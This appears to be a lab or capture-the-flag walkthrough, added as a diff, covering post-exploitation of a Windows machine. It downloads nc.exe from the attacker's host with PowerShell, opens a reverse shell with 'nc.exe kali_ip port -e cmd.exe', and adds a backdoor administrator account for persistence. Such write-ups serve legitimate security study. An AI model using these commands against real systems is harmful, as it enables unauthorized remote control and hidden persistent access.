@@ -1,0 +1,49 @@
+
+Now that we've thoroughly compromised our target machine, let's return to our exploitation tools so that we can gain remote shell access and persistence.
+
+
+1. Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.
+
+
+From here We have done it manually: 
+
+What we have done is just:
+
+1. Just hosted a python server in the directory where we have nc.exe file..
+
+2. From victim machine we used:
+
+powershell -c wget "http://10.11.1.198:8080/nc.exe" -outfile "nc.exe"
+
+3. With this we download nc.exe 
+
+4. Run netcat on host
+
+5. Run on win victim: nc.exe kali_ip port -e cmd.exe
+
+This is done to get a shell.....
+
+6. Now, use: whoami
+
+We are nt authority\system
+
+7.  Now we have to make a previledged user to make persistance
+
+8. For user creation: net user <username> <password> /add
+   
+   For adding user to admin: net localgroup "Administrators" <username> /add   	
+
+9. Now check it:
+
+use : net users
+
+use : net localgroup "Administrators"
+
+10. Now we can logout of wade user, with which we previusly logged in.
+
+Now we will login via new previledged user that we created for persistance
+
+11. Now we go to Control panel ---> User Account ---> User Accounts
+
+We will see it is Admin
+
